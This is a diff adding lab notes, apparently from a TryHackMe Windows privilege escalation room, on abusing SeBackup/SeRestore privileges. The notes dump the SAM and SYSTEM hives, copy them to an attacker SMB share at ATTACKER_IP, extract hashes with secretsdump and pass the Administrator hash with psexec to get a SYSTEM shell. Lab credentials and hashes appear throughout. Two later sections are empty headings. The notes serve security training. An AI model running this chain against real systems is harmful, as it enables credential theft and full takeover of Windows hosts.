@@ -592,4 +592,145 @@
 
 </details>
 
+<details>
+<summary><h2> 4. Abusing Dangerous Privileges </h2></summary>
+
+> # A. Windows Privileges
+> Each user has a set of privileges that can be checked with the following command:
+>> ```
+>> whoami /priv
+>> ```
+>
+> A complete list of available privileges on Windows systems is available [here](https://learn.microsoft.com/en-us/windows/win32/secauthz/privilege-constants). From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the [Priv2Admin](https://github.com/gtworek/Priv2Admin) Github project.
+>
+> While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.
+>
+> # B. SeBackup / SeRestore
+> The **SeBackup** and **SeRestore** privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to _perform backups from a system without requiring full administrative privileges_.
+>
+> Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives **to extract the local Administrator's password hash**.
+>
+> Log in to the target machine via RDP using the following credentials:
+> 
+> User: `THMBackup` Password: `CopyMaster555`
+>
+>> Open command prompt as administrator. Check the account privileges with the ff command:
+>
+> ### TARGET MACHINE:
+>> ```
+>> C:\> whoami /priv
+>>
+>> PRIVILEGES INFORMATION
+>> ----------------------
+>>
+>> Privilege Name                Description                    State
+>> ============================= ============================== ========
+>> SeBackupPrivilege             Back up files and directories  Disabled
+>> SeRestorePrivilege            Restore files and directories  Disabled
+>> SeShutdownPrivilege           Shut down the system           Disabled
+>> SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+>> SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+>> ```
+>
+>> To backup the SAM and SYSTEM hashes, we can use the ff. command:
+>
+> ### TARGET MACHINE:
+>> ```
+>> C:\> reg save hklm\system C:\Users\THMBackup\system.hive
+>> The operation completed successfully.
+>>
+>> C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
+>> The operation completed successfully.
+>> ```
+>
+> This creates duplicate files with the registry hives content.
+>
+> We can now copy these files to our attacker machine using SMB or any other available method.
+>
+> ### ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ mkdir share
+>> user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share 
+>>
+>> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+>> [*] Config file parsed
+>> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+>> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+>> [*] Config file parsed
+>> ```
+>>> IF PYTHON 3.9 DOESNT WORK TO YOU OR if folders from the example can't be found, look for the file dir path:
+>>> ```
+>>> find / -type f -name "smbserver.py" 2>/dev/null
+>>> ```
+> This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, use impacket to retrieve the users' password hashes:
+> 
+> ### TARGET MACHINE:
+>> ```
+>> C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
+>> C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
+>
+> ### ATTACKER MACHINE:
+>> ```
+>> Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+>>
+>> [*] Config file parsed
+>> [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
+>> [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
+>> [*] Config file parsed
+>> [*] Config file parsed
+>> [*] Incoming connection (10.10.8.143,49881)
+>> [*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+>> [*] User WPRIVESC2\THMBackup authenticated successfully
+>> [*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:2e1d19e8982a827d9c10a33cf2c4df23:010100000000000080af2eeef193db010627d4ce767c439500000000010010006300780052005200690072004500610003001000630078005200520069007200450061000200100067004700560076005500620055006a000400100067004700560076005500620055006a000700080080af2eeef193db010600040002000000080030003000000000000000000000000030000046636b1266546c840d57fc859740047f5562371c3529f221463ce045cc00aa270a001000000000000000000000000000000000000900200063006900660073002f00310030002e0034002e003100320034002e00380030000000000000000000
+>> [*] Connecting Share(1:IPC$)
+>> [*] Connecting Share(2:public)
+>> [*] Disconnecting Share(1:IPC$)
+>> [*] Disconnecting Share(2:public)
+>> [*] Closing down connection (10.10.8.143,49881)
+>> [*] Remaining connections []
+>> [*] Incoming connection (10.10.8.143,49887)
+>> [*] AUTHENTICATE_MESSAGE (WPRIVESC2\THMBackup,WPRIVESC2)
+>> [*] User WPRIVESC2\THMBackup authenticated successfully
+>> [*] THMBackup::WPRIVESC2:aaaaaaaaaaaaaaaa:ddda436b4b94a94b91d2649b99f5ae95:0101000000000000004bba32f293db01030e61cff7f1225b00000000010010006300780052005200690072004500610003001000630078005200520069007200450061000200100067004700560076005500620055006a000400100067004700560076005500620055006a0007000800004bba32f293db010600040002000000080030003000000000000000000000000030000046636b1266546c840d57fc859740047f5562371c3529f221463ce045cc00aa270a001000000000000000000000000000000000000900200063006900660073002f00310030002e0034002e003100320034002e00380030000000000000000000
+>> [*] Connecting Share(1:public)
+>> ```
+> We can finally use the Administrator's hash to perform a **Pass-the-Hash attack** and gain access to the target machine with SYSTEM privileges:
+> 
+> ### ATTACKER MACHINE:
+>> ```
+>> user@attackerpc$ cd share  // if not in the share dir yet
+>> user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
+>> Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+>>
+>> [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
+>> [*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
+>> Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
+>> Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+>>
+>> user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.8.143
+>> Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation
+>>
+>> [*] Requesting shares on 10.10.175.90.....
+>> [*] Found writable share ADMIN$
+>> [*] Uploading file nfhtabqO.exe
+>> [*] Opening SVCManager on 10.10.175.90.....
+>> [*] Creating service RoLE on 10.10.175.90.....
+>> [*] Starting service RoLE.....
+>> [!] Press help for extra shell commands
+>> Microsoft Windows [Version 10.0.17763.1821]
+>> (c) 2018 Microsoft Corporation. All rights reserved.
+>>
+>> C:\Windows\system32> whoami
+>> nt authority\system
+>> ``` 
+> 
+> # C. SeTakeOwnership
+> 
+> 
+> 
+> # D. Selmpersonate / SeAssignPrimaryToken
+> 
+
+
+</details>
 
